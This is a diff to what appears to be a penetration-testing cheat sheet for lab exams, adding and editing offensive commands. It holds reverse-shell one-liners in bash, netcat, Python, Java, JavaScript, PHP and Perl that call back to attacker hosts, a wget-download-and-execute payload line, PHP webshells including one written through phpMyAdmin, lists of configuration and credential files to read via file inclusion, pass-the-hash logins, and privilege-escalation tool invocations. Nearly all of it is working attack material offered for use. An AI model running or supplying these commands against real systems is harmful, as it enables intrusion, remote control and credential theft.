@@ -13,6 +13,7 @@
 
 64 bit:
 %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
+C:\Windows\SysNative\Windowspowershell\v1.0\powershell.exe
 ```
 
 ## Python tty spawn
@@ -46,8 +47,19 @@ Linux
 /var/log/apache/error.log
 /etc/httpd/logs/acces_log 
 /etc/httpd/logs/error_log 
-/proc/self/environ
 /proc/version
+/proc/self/environ
+/proc/self/cmdline
+/etc/httpd/conf/httpd.conf
+/etc/apache2/sites-enabled/000-default.conf
+/etc/systemd/system/redis.service
+WordPress: /var/www/html/wp-config.php
+Joomla: /var/www/configuration.php
+Dolphin CMS: /var/www/html/inc/header.inc.php
+Drupal: /var/www/html/sites/default/settings.php
+Mambo: /var/www/configuration.php
+PHPNuke: /var/www/config.php
+PHPbb: /var/www/config.php
 ```
 Windows
 ```
@@ -80,6 +92,7 @@ C:\Windows\repair\system
 ## PHP cmd injection
 ```
 <?php system("whoami"); ?>
+<?php system("bash -i >& /dev/tcp/192.168.49.56/80 0>&1"); ?>
 <?php system($_GET['cmd']); ?>
 <?php passthru($_GET['cmd']); ?>
 ```
@@ -116,6 +129,7 @@ SHOW TABLES
 SELECT host, user, password FROM mysql.user
 dbuser/dbpass
 db_user/db_pass
+db_password
 
 # Windows:
 Mssql (port 1433), common username = sa
@@ -178,7 +192,13 @@ curl -i -s -k -X $'GET' $'https://10.1.1.1/php-reverse-shell.php'
 
 # POST:
 curl -i -s -k -X $'POST' --data-binary $'cmd=chmod%20%2Bs%20%2Fusr%2Fbin%2Fmysql&submit' $'http://10.1.1.1:8080/start_page.php?page=cmd.php'
-curl -s --data "<?php shell_exec('nc -e /bin/sh 192.168.119.243 443') ?>" 'http://10.11.1.1/internal/advanced_comment_system/admin.php?ACS_path=php://input'
+curl -s --data "<?php shell_exec('nc -e /bin/sh 192.168.1.1 443') ?>" 'http://10.11.1.1/internal/advanced_comment_system/admin.php?ACS_path=php://input'
+curl -s --data "2*2" 'http://192.168.63.117:50000/verify?code='
+curl -i -s -k -X $'POST' --data-binary $'code=2*2' $'http://192.168.1.1:50000/verify'
+curl -X POST http://192.168.1.1:13337/update \
+   -H 'Content-Type: application/json' \
+   -d '{"user":"clumsyadmin","url":"http://192.168.1.1/rev64.elf"}' 
+curl -F "files=@simplecmd.php" http://10.11.1.1/books/apps/jquery-file-upload/server/php/
 ```
 
 ## Port forwarding
@@ -188,6 +208,9 @@ ssh -f -N -D 9050 sean@10.11.1.251
 
 ssh -N -R 127.0.0.1:5555:127.0.0.1:4444 victim@10.1.1.1 -f             ("their ip":port:"our ip":port) - receiving reverse shell
 ssh -N -R 127.0.0.1:8080:127.0.0.1:8080 kali@192.168.119.243 -f        ("our ip":port:"their ip":port) - connecting server
+
+plink.exe -ssh -l kali -pw password -R 127.0.0.1:3389:172.16.1.1:3389 192.168.1.1
+plink.exe -ssh -l kali -i id_rsa.ppk -R 127.0.0.1:3389:172.16.1.1:3389 192.168.1.1
 ```
 
 ## Scans
@@ -287,11 +310,28 @@ Z:\nc64.exe -nc 192.168.119.243 443 -e cmd.exe              (direct execution)
 ### One liner
 Linux
 ```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.243 443 >/tmp/f
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.243",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-bash -i >& /dev/tcp/192.168.119.243/443 0>&1
-/bin/bash -l > /dev/tcp/192.168.119.243/443 0<&1 2>&1
-nc -nv 192.168.119.243 443 -e /bin/bash
+bash -i >& /dev/tcp/192.168.1.1/9002 0>&1
+/bin/bash -l > /dev/tcp/192.168.1.1/9002 0<&1 2>&1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.1 80 >/tmp/f
+nc -nv 192.168.1.1 443 -e /bin/bash
+
+wget -P /tmp http://kali/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Java:
+r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
+
+Javascript:
+(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(LPORT, "LHOST", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
+
+php:
+php -r '$sock=fsockopen("LHOST",LPORT);system("/bin/sh -i <&3 >&3 2>&3");'
+
+Perl Linux:
+perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+Perl windows:
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"LPORT:LHOST");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 Windows
 ```
@@ -319,7 +359,7 @@ EXITFUNC=thread, -b "\x00\x0a\x0d\x25\x26\x2b\x3d", –e x86/shikata_ga_nai, -i 
 ```
 Other files/webshell
 ```
-msfvenom -f asp -f elf -f c -f raw -f js_le -f hta-psh -f war 
+msfvenom -f asp -f jsp -f elf -f c -f raw -f js_le -f hta-psh -f war 
 locate webshell to list webshell
 common used: php-reverse-shell.php
 ```
@@ -412,6 +452,7 @@ findstr /si password *.xml *.ini *.txt *.config     (find word inside files type
 rdesktop -E -r clipboard:CLIPBOARD -u eric -p sup3rs3cr3t 10.11.1.1
 xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:administrator /v:10.11.1.1
 xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:administrator /pth:cb2d5be3c78be06d47b697468ad3b33b /v:10.11.1.1
+xfreerdp /u:"username" /v:IP:3389
 
 # Pth Winexe/Psexec/Smb
 pth-winexe -U tomahawk%00000000000000000000000000000000:AB730EFA31140CE6A9262841E4109C95 //10.1.1.248 cmd.exe
@@ -476,6 +517,7 @@ PsExec64.exe -i -accepteula -d -s C:\Users\nicky\AppData\Local\Temp\reverseshell
 
 # SeImpersonatePrivilege
 PrintSpoofer64.exe -i -c cmd.exe
+PrintSpoofer64.exe -i -c C:\Users\nicky\AppData\Local\Temp\reverseshell64.exe
 JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.119.243 443 -e cmd.exe" 
 JuicyPotato64.exe -t * -p c:\windows\system32\cmd.exe -l 1338 -c {6d18ad12-bde3-4393-b311-099c346e6df9} -a "/c C:\Users\jill\AppData\Local\Temp\nc.exe 192.168.119.243 443 -e cmd.exe" 
 
@@ -499,6 +541,13 @@ net localgroup "Remote Desktop Users" Bill /add
 
 # Print proof
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
+```
+
+##Phpmyadmin
+```
+create new database, go SQL tabs
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\cmd.php" 
+access through webpage
 ```
 
 ## Post exploitation 
